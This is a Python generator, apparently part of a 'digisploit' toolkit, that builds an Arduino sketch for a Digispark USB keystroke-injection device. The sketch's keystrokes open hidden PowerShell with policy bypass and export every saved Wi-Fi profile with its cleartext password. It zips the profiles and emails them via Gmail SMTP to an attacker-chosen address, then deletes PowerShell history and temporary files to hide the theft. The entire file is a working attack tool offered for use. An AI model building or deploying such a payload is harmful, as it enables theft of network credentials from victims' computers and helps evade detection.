import os, sys,time
from colorama import Fore

def wifi_grabber_mail():
    script_ino_1 = '''
#include "DigiKeyboard.h"

char modo[] = "powershell -nop -win h -noni -exec bypass";
char sair[] = "exit";

void setup() {

}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println(modo);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("md temp");
  DigiKeyboard.println("cd temp");
  DigiKeyboard.println("netsh wlan export profile key=clear");
  DigiKeyboard.println("cd ..");

  DigiKeyboard.print(F("$source = \\"temp\\""));
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(F("$destination = \\"wifi.zip\\""));
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(F("If(Test-path $destination) {Remove-item $destination}"));
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(F("Add-Type -assembly \\"system.io.compression.filesystem\\""));
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print(F("[io.compression.zipfile]::CreateFromDirectory($Source, $destination)"));
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);'''

    script_ino_2 = '''
  DigiKeyboard.print(F("$email = \\"{}\\";"));'''  # email you will send
    script_ino_3 = '''
  DigiKeyboard.print(F("$addressee = \\"{}\\";"));'''  # email you will receive
    script_ino_4 = '''
  DigiKeyboard.print(F("$wifi = \\"$env:userprofile\\\wifi.zip\\";"));'''
    script_ino_5 = '''
  DigiKeyboard.print(F("$pass = \\"{}\\";"));'''  # password of the email you are going to send

    script_ino_6 = '''
  DigiKeyboard.print(F("$smtpServer = \\"smtp.gmail.com\\";"));
  DigiKeyboard.print(F("$port = \\"587\\";"));
  
  DigiKeyboard.print(F("$securestring = $pass | ConvertTo-SecureString -AsPlainText -Force;"));
  DigiKeyboard.print(F("$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $email, $securestring;"));
  DigiKeyboard.print(F("$msg = new-object Net.Mail.MailMessage;"));
  DigiKeyboard.print(F("$smtp = new-object Net.Mail.SmtpClient($smtpServer, $port);"));
  DigiKeyboard.print(F("$smtp.EnableSsl = $true;"));
  DigiKeyboard.print(F("$msg.From = \\"$email\\";"));
  DigiKeyboard.print(F("$msg.To.Add(\\"$addressee\\");"));
  DigiKeyboard.print(F("$msg.Attachments.Add(\\"$wifi\\");"));
  DigiKeyboard.print(F("$msg.BodyEncoding = [system.Text.Encoding]::Unicode;"));
  DigiKeyboard.print(F("$msg.SubjectEncoding = [system.Text.Encoding]::Unicode;"));
  DigiKeyboard.print(F("$msg.IsBodyHTML = $true ;"));
  DigiKeyboard.print(F("$msg.Subject = \\"WiFi Captured!\\";"));
  DigiKeyboard.print(F("$msg.Body = \\"<h2> WiFi has been successfully captured. </h2>\\"; "));
  DigiKeyboard.print(F("$SMTP.Credentials = $cred;"));
  DigiKeyboard.print(F("$smtp.Send($msg);"));
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(sair);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(modo);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("del (Get-PSReadlineOption).HistorySavePath;"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("rm \\"$env:userprofile\\\temp\\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print(F("rm \\"$env:userprofile\\\wifi.zip\\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print(sair);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;){ /*empty*/ }
}'''

    print(f'\n{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} 1st Step: Create wifi_grabber_mail.ino\n')

    email_sender = input(f'{Fore.LIGHTRED_EX}root@digisploit{Fore.LIGHTWHITE_EX}:{Fore.LIGHTBLUE_EX}(win/wifi/grabber_mail){Fore.LIGHTWHITE_EX} Sender Email: ')
    email_receiver = input(f'{Fore.LIGHTRED_EX}root@digisploit{Fore.LIGHTWHITE_EX}:{Fore.LIGHTBLUE_EX}(win/wifi/grabber_mail){Fore.LIGHTWHITE_EX} Email Receiver: ')
    email_sender_pass = input(f'{Fore.LIGHTRED_EX}root@digisploit{Fore.LIGHTWHITE_EX}:{Fore.LIGHTBLUE_EX}(win/wifi/grabber_mail){Fore.LIGHTWHITE_EX} Sender Email Password: ')

    print(f'\n{Fore.LIGHTGREEN_EX}[+]{Fore.LIGHTWHITE_EX} Finished! Results in "constructions/wifi_grabber_mail"')
    time.sleep(5)

    result = open('constructions/wifi_grabber_mail/wifi_grabber_mail.ino', 'w')
    result.write(script_ino_1)
    result.write(script_ino_2.format(email_sender))
    result.write(script_ino_3.format(email_receiver))
    result.write(script_ino_4)
    result.write(script_ino_5.format(email_sender_pass))
    result.write(script_ino_6)
    result.close()